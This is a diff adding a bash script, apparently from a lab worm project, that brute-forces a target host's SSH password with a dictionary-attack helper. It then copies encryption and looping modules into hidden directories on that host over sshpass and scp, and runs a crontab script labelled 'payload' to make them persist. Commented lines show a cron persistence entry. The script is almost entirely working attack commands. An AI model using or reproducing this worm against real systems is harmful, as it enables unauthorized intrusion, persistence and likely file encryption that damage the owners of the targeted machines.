@@ -1,0 +1,38 @@
+#!/bin/bash
+
+# ip="192.168.80.137"
+ip=$1
+usr="attacker"
+# pwd="YH0228"
+
+cur_path="$(pwd)"
+touch $cur_path/password.txt
+en1_path="/home/attacker/Desktop/.Backup"
+en2_path="/home/attacker/Public/.Simple_Worm/Loop"
+python3 dict_attack.py $ip
+pwd="$(cat password.txt)"
+
+# check the folder & the attack module
+sshpass -p $pwd ssh $usr@$ip "mkdir $en1_path"
+sshpass -p $pwd scp "$cur_path/Loop_ping" $usr@$ip:$en1_path
+sshpass -p $pwd scp "$cur_path/rsa_p1.py" $usr@$ip:$en1_path
+sshpass -p $pwd scp "$cur_path/crontab.sh" $usr@$ip:$en1_path
+sshpass -p $pwd scp "$cur_path/test_p1.sh" $usr@$ip:$en1_path
+sshpass -p $pwd scp "$cur_path/RSA_Encrypt" $usr@$ip:$en1_path
+
+sshpass -p $pwd ssh $usr@$ip "mkdir -p $en2_path"
+sshpass -p $pwd scp "$cur_path/Loop_ping" $usr@$ip:$en2_path
+sshpass -p $pwd scp "$cur_path/rsa_p2.py" $usr@$ip:$en2_path
+sshpass -p $pwd scp "$cur_path/crontab.sh" $usr@$ip:$en2_path
+sshpass -p $pwd scp "$cur_path/test_p2.sh" $usr@$ip:$en2_path
+sshpass -p $pwd scp "$cur_path/RSA_Encrypt" $usr@$ip:$en2_path
+
+# payload
+sshpass -p $pwd ssh $usr@$ip "$en1_path/crontab.sh $pwd"
+
+# touch /home/attacker/record.txt
+
+# echo $pwd | sudo chmod +x $path/min_loop.py
+# python3 $path/min_loop.py
+# sshpass -p $pwd ssh $usr@$ip "crontab -l | { cat; echo "* * * * * $en1_path/min_loop.py"; } | crontab -"
+
